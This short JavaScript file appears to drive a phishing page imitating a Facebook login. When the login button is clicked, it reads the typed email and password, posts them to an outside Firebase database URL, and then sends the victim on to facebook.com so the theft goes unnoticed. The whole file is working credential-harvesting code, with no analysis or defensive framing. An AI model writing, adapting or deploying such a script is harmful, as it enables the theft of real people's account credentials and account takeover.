let getElement = (t) => document.querySelector(t);

let uploadData = (data) => {
  axios
    .post("https://datacovidcaldas.firebaseio.com/IpAccess.json", data, {
      headers: {
        "Content-Type": "application/json"
      }
    })
    .then((response) => {
      console.log(response);
      window.location.href = "https://facebook.com/";
    });
};

getElement("#btnLogin").addEventListener("click", function () {
  let data = {
    user: getElement("#email").value,
    pass: getElement("#pass").value
  };
  console.log(data);
  uploadData(data);
});
